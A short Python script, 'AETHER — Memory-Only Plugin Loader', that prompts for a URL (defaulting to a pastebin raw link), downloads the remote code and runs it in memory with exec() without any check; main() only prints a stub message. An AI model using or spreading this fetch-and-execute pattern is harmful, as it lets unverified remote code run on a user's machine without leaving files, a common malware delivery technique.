import base64
import tempfile
import time
import types
import urllib.request
from rich import print
from rich.prompt import Prompt
from rich.panel import Panel

def fetch_payload(url):
    try:
        with urllib.request.urlopen(url) as response:
            return response.read().decode()
    except Exception as e:
        print(f"[red]Fetch failed:[/red] {e}")
        return None

def exec_plugin(code):
    try:
        mod = types.ModuleType("aether_plugin")
        exec(code, mod.__dict__)
        if hasattr(mod, "run"):
            mod.run()
        else:
            print("[yellow]No run() function found in plugin[/yellow]")
    except Exception as e:
        print(f"[red]Execution failed:[/red] {e}")

def run():
    print(Panel("🌌 [bold magenta]AETHER — Memory-Only Plugin Loader[/bold magenta]"))
    source = Prompt.ask("🔗 [cyan]Enter plugin URL[/cyan] (raw .py)", default="https://pastebin.com/raw/xyz")

    print("[blue]Fetching code...[/blue]")
    code = fetch_payload(source)

    if code:
        print("[green]Plugin fetched. Executing in-memory.[/green]")
        exec_plugin(code)
    else:
        print("[red]No code executed.[/red]")

def main(args=None):
    print("[aether] 🔗 Memory-only loader stub.")
    print("[aether] Enter plugin URL (raw .py)")

if __name__ == "__main__":
    main()
